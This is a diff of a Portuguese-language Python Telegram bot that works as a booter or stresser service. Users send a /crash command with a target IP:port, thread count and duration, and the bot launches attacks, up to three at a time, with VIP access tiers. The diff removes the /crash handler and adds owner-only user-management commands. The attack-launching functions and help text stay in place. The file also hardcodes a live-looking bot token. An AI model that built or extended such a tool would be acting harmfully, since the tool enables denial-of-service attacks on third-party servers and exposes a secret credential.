@@ -7,16 +7,18 @@ from threading import Thread
 BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
 SEU_ID_TELEGRAM = 6430703027
 bot = telebot.TeleBot(BOT_TOKEN)
+
+# Configurações e listas
 processos = {}
+authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
 vip_users = []  # Lista de usuários VIP
-vip_commands = ['/crash']  # Comandos restritos a VIPs
+vip_commands = []  # Comandos restritos a VIPs
 MAX_ATTACKS = 3  # Limite de ataques simultâneos
 
 # Função para validar o formato de IP e Porta
 def validar_ip_porta(ip_porta):
     padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
-    match = re.match(padrao, ip_porta)
-    return match is not None
+    return re.match(padrao, ip_porta) is not None
 
 # Função para executar o comando do ataque
 def executar_comando(ip_porta, threads, tempo):
@@ -42,51 +44,6 @@ def manage_attacks():
         oldest_process.terminate()  # Termina o processo mais antigo
         del processos[list(processos.keys())[0]]  # Remove da lista de processos
 
-# Comando /crash
-@bot.message_handler(commands=['crash'])
-def crash_server(message):
-    if '/crash' in vip_commands and message.from_user.id not in vip_users and message.from_user.id != SEU_ID_TELEGRAM:
-        bot.send_message(message.chat.id, "❌ Este comando é restrito a usuários VIP.")
-        return
-
-    try:
-        command_parts = message.text.split()
-
-        # Verifica o número de argumentos enviados
-        if len(command_parts) == 2:  # Apenas IP:PORTA fornecido
-            ip_port = command_parts[1]
-            threads = "10"  # Valor padrão
-            duration = "900"  # Valor padrão
-        elif len(command_parts) == 3:  # IP:PORTA e duração fornecidos
-            ip_port = command_parts[1]
-            threads = "10"  # Valor padrão
-            duration = command_parts[2]
-        elif len(command_parts) == 4:  # IP:PORTA, threads e duração fornecidos
-            ip_port = command_parts[1]
-            threads = command_parts[2]
-            duration = command_parts[3]
-        else:
-            bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> [threads] [tempo]")
-            return
-
-        # Valida o formato do IP e Porta
-        if not validar_ip_porta(ip_port):
-            bot.send_message(message.chat.id, "Formato inválido de IP e porta. Use o formato: IP:PORTA")
-            return
-
-        manage_attacks()  # Gerencia o limite de ataques
-
-        # Inicia o ataque em uma nova thread
-        thread = Thread(target=executar_comando, args=(ip_port, threads, duration))
-        thread.start()
-
-        bot.send_message(
-            message.chat.id, 
-            f"🚀 Ataque enviado para {ip_port} com {threads} threads por {duration} segundos!"
-        )
-    except Exception as e:
-        bot.send_message(message.chat.id, f"❌ Ocorreu um erro: {str(e)}")
-
 # Comando /start
 @bot.message_handler(commands=['start'])
 def start_message(message):
@@ -94,9 +51,9 @@ def start_message(message):
         "Bem-vindo ao bot! 🚀\n\n"
         "Aqui estão os comandos disponíveis para você:\n\n"
         "Comandos básicos:\n"
-        "/crash <IP:PORTA> [threads] [tempo] - Envia um ataque ao IP especificado.\n"
+        "/crash <IP:PORTA> <threads> <tempo> - Envia um ataque ao IP especificado.\n"
         "/meuid - Mostra seu ID de usuário.\n\n"
-        "Comandos para usuários VIP:\n"
+        "Comandos para usuários autorizados e VIPs:\n"
         "/adduser <ID> - Adiciona um usuário autorizado.\n"
         "/removeuser <ID> - Remove um usuário autorizado.\n"
         "/promovervip <ID> - Promove um usuário a VIP. (Somente o dono pode)\n"
@@ -108,6 +65,107 @@ def start_message(message):
     )
     bot.send_message(message.chat.id, welcome_text)
 
+# Comando /meuid
+@bot.message_handler(commands=['meuid'])
+def send_user_id(message):
+    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")
+
+# Comando /adduser
+@bot.message_handler(commands=['adduser'])
+def add_user(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.send_message(message.chat.id, "Apenas o dono pode adicionar usuários.")
+        return
+    try:
+        user_id = int(message.text.split()[1])
+        if user_id not in authorized_users:
+            authorized_users.append(user_id)
+            bot.send_message(message.chat.id, f"Usuário {user_id} adicionado com sucesso!")
+        else:
+            bot.send_message(message.chat.id, f"O usuário {user_id} já está autorizado.")
+    except:
+        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>")
+
+# Comando /removeuser
+@bot.message_handler(commands=['removeuser'])
+def remove_user(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.send_message(message.chat.id, "Apenas o dono pode remover usuários.")
+        return
+    try:
+        user_id = int(message.text.split()[1])
+        if user_id in authorized_users:
+            authorized_users.remove(user_id)
+            bot.send_message(message.chat.id, f"Usuário {user_id} removido com sucesso!")
+        else:
+            bot.send_message(message.chat.id, f"O usuário {user_id} não está na lista de autorizados.")
+    except:
+        bot.send_message(message.chat.id, "Uso correto: /removeuser <ID>")
+
+# Comando /promovervip
+@bot.message_handler(commands=['promovervip'])
+def promover_vip(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.send_message(message.chat.id, "Apenas o dono pode promover usuários a VIP.")
+        return
+    try:
+        user_id = int(message.text.split()[1])
+        if user_id not in vip_users:
+            vip_users.append(user_id)
+            bot.send_message(message.chat.id, f"Usuário {user_id} promovido a VIP!")
+        else:
+            bot.send_message(message.chat.id, f"O usuário {user_id} já é VIP.")
+    except:
+        bot.send_message(message.chat.id, "Uso correto: /promovervip <ID>")
+
+# Comando /rebaixarvip
+@bot.message_handler(commands=['rebaixarvip'])
+def rebaixar_vip(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.send_message(message.chat.id, "Apenas o dono pode rebaixar usuários VIP.")
+        return
+    try:
+        user_id = int(message.text.split()[1])
+        if user_id in vip_users:
+            vip_users.remove(user_id)
+            bot.send_message(message.chat.id, f"Usuário {user_id} rebaixado de VIP com sucesso!")
+        else:
+            bot.send_message(message.chat.id, f"O usuário {user_id} não é VIP.")
+    except:
+        bot.send_message(message.chat.id, "Uso correto: /rebaixarvip <ID>")
+
+# Comando /addcomandovip
+@bot.message_handler(commands=['addcomandovip'])
+def add_command_vip(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.send_message(message.chat.id, "Apenas o dono pode adicionar comandos VIP.")
+        return
+    try:
+        comando = message.text.split()[1].lower()
+        if comando not in vip_commands:
+            vip_commands.append(comando)
+            bot.send_message(message.chat.id, f"O comando '{comando}' foi adicionado à lista de comandos VIP.")
+        else:
+            bot.send_message(message.chat.id, f"O comando '{comando}' já é VIP.")
+    except:
+        bot.send_message(message.chat.id, "Uso correto: /addcomandovip <comando>")
+
+# Comando /revcomandovip
+@bot.message_handler(commands=['revcomandovip'])
+def remove_command_vip(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.send_message(message.chat.id, "Apenas o dono pode remover comandos VIP.")
+        return
+    try:
+        comando = message.text.split()[1].lower()
+        if comando in vip_commands:
+            vip_commands.remove(comando)
+            bot.send_message(message.chat.id, f"O comando '{comando}' foi removido da lista de comandos VIP.")
+        else:
+            bot.send_message(message.chat.id, f"O comando '{comando}' não é VIP.")
+    except:
+        bot.send_message(message.chat.id, "Uso correto: /revcomandovip <comando>")
+
 # Função para manter o bot ativo
 def keep_alive():
     while True:
@@ -117,5 +175,6 @@ def keep_alive():
             print(f"Erro no bot: {e}")
             time.sleep(15)
 
+# Iniciar o bot
 if __name__ == "__main__":
     keep_alive()
